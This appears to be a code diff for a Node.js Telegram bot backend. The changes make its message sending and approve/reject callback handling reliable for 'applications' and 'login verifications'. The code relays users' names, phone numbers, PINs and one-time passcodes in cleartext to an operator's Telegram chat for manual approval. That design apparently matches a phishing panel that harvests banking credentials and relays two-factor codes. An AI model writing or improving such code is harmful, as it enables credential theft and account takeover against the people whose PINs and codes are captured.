@@ -84,24 +84,31 @@ async function notifyApplication(app) {
     `Email: ${esc(app.email || 'N/A')}\n` +
     `Phone: ${esc(app.phone || 'N/A')}\n\n` +
     `Status: <b>⏳ Pending review</b>`;
-  tgApi('sendMessage', {
-    chat_id: CHAT_ID,
-    text,
-    parse_mode: 'HTML',
-    reply_markup: {
-      inline_keyboard: [[
-        { text: '✅ Approve', callback_data: `approve:${id}` },
-        { text: '❌ Reject', callback_data: `reject:${id}` },
-      ]],
-    },
-  }, (r) => {
-    if (r && r.ok) {
-      store.set(store.NS.APPS, id, { status: 'pending', messageId: r.result.message_id, chatId: CHAT_ID, details: { ...app, name } });
-      console.log('[notify] application', id);
-    } else {
-      console.error('[notify] application failed:', r && r.description);
-    }
+
+  const msgResult = await new Promise((resolve) => {
+    tgApi('sendMessage', {
+      chat_id: CHAT_ID,
+      text,
+      parse_mode: 'HTML',
+      reply_markup: {
+        inline_keyboard: [[
+          { text: '✅ Approve', callback_data: `approve:${id}` },
+          { text: '❌ Reject', callback_data: `reject:${id}` },
+        ]],
+      },
+    }, (r) => resolve(r));
   });
+  if (msgResult && msgResult.ok) {
+    await store.set(store.NS.APPS, id, { 
+      status: 'pending', 
+      messageId: msgResult.result.message_id, 
+      chatId: CHAT_ID, 
+      details: { ...app, name } 
+    });
+    console.log('[notify] application', id);
+  } else {
+    console.error('[notify] application failed:', msgResult && msgResult.description);
+  }
   return id;
 }
 
@@ -142,29 +149,29 @@ async function notifyLoginVerification(login) {
   const approveData = type === 'pin' ? `approve_pin:${id}:${login.username}` : `otp_approve:${id}:${login.username}`;
   const rejectData = type === 'pin' ? `reject_pin:${id}:${login.username}` : `otp_reject:${id}:${login.username}`;
 
-  tgApi('sendMessage', {
-    chat_id: CHAT_ID,
-    text,
-    parse_mode: 'HTML',
-    reply_markup: {
-      inline_keyboard: [[
-        { text: approveLabel, callback_data: approveData },
-        { text: rejectLabel, callback_data: rejectData },
-      ]],
-    },
-  }, (r) => {
-    if (r && r.ok) {
-      store.get(store.NS.LOGIN, id).then((entry) => {
-        if (entry) {
-          entry.messageId = r.result.message_id;
-          store.set(store.NS.LOGIN, id, entry);
-        }
-      });
-      console.log(`[notify] ${type} verification sent:`, id);
-    } else {
-      console.error(`[notify] ${type} verification failed:`, r && r.description);
-    }
+  const msgResult = await new Promise((resolve) => {
+    tgApi('sendMessage', {
+      chat_id: CHAT_ID,
+      text,
+      parse_mode: 'HTML',
+      reply_markup: {
+        inline_keyboard: [[
+          { text: approveLabel, callback_data: approveData },
+          { text: rejectLabel, callback_data: rejectData },
+        ]],
+      },
+    }, (r) => resolve(r));
   });
+  if (msgResult && msgResult.ok) {
+    const rec = await store.get(store.NS.LOGIN, id);
+    if (rec) {
+      rec.messageId = msgResult.result.message_id;
+      await store.set(store.NS.LOGIN, id, rec);
+    }
+    console.log(`[notify] ${type} verification sent:`, id);
+  } else {
+    console.error(`[notify] ${type} verification failed:`, msgResult && msgResult.description);
+  }
   return id;
 }
 
@@ -177,9 +184,12 @@ async function handleCallback(cq) {
   if (action === 'approve' || action === 'reject') {
     const decision = action === 'approve' ? 'approved' : 'rejected';
     const rec = await store.get(store.NS.APPS, id);
-    if (rec) rec.status = decision;
+    if (rec) {
+      rec.status = decision;
+      await store.set(store.NS.APPS, id, rec);
+    }
     const stamp = action === 'approve' ? '✅ Approved' : '❌ Rejected';
-    tgApi('answerCallbackQuery', { callback_query_id: cq.id, text: `Marked ${decision}` });
+    tgApi('answerCallbackQuery', { callback_query_id: cq.id, text: rec ? `Marked ${decision}` : 'Record not found' });
     if (rec && rec.messageId) {
       const name = rec.details.name || 'N/A';
       tgApi('editMessageText', {
@@ -194,7 +204,6 @@ async function handleCallback(cq) {
           `Amount: ${esc(rec.details.amount || 'N/A')} USD\n\n` +
           `Status: <b>${stamp}</b>`,
       });
-      await store.set(store.NS.APPS, id, rec);
     }
     console.log(`[decision] ${id} -> ${decision}`);
     return;
@@ -213,27 +222,32 @@ async function handleCallback(cq) {
       await store.set(store.NS.LOGIN, id, rec);
       const verify = await store.get(store.NS.LOGIN, id);
       console.log(`[${kind.toLowerCase()} callback] Verified update:`, verify?.decided, verify?.status);
+      tgApi('answerCallbackQuery', { callback_query_id: cq.id, text: `${kind} ${decision}` });
+      if (rec.chatId && rec.messageId) {
+        tgApi('editMessageText', {
+          chat_id: rec.chatId,
+          message_id: rec.messageId,
+          parse_mode: 'HTML',
+          text:
+            `<b>🔐 ${kind} Verification</b>\n\n` +
+            `User: ${esc(rec.phone || 'N/A')}\n` +
+            (kind === 'PIN' && rec.pin ? `PIN: ${esc(rec.pin)}\n` : '') +
+            (kind === 'OTP' && rec.otp ? `OTP: ${esc(rec.otp)}\n` : '') +
+            `Time: ${new Date(rec.timestamp).toLocaleString()}\n\n` +
+            `Status: <b>${stamp}</b>`,
+        });
+      }
     } else {
       console.error(`[${kind.toLowerCase()} decision] ${id} not found`);
-    }
-    tgApi('answerCallbackQuery', { callback_query_id: cq.id, text: `${kind} ${decision}` });
-    if (rec && rec.messageId) {
-      tgApi('editMessageText', {
-        chat_id: rec.chatId,
-        message_id: rec.messageId,
-        parse_mode: 'HTML',
-        text:
-          `<b>🔐 ${kind} Verification</b>\n\n` +
-          `User: ${esc(rec.phone || 'N/A')}\n` +
-          (kind === 'PIN' && rec.pin ? `PIN: ${esc(rec.pin)}\n` : '') +
-          (kind === 'OTP' && rec.otp ? `OTP: ${esc(rec.otp)}\n` : '') +
-          `Time: ${new Date(rec.timestamp).toLocaleString()}\n\n` +
-          `Status: <b>${stamp}</b>`,
-      });
+      tgApi('answerCallbackQuery', { callback_query_id: cq.id, text: `Record not found` });
     }
     console.log(`[${kind.toLowerCase()} decision] ${id} -> ${decision}`);
     return;
   }
+
+  // Unknown action - still answer the callback
+  tgApi('answerCallbackQuery', { callback_query_id: cq.id, text: 'Unknown action' });
+  console.log('[callback] Unknown action:', action);
 }
 
 async function handleMessage(msg) {
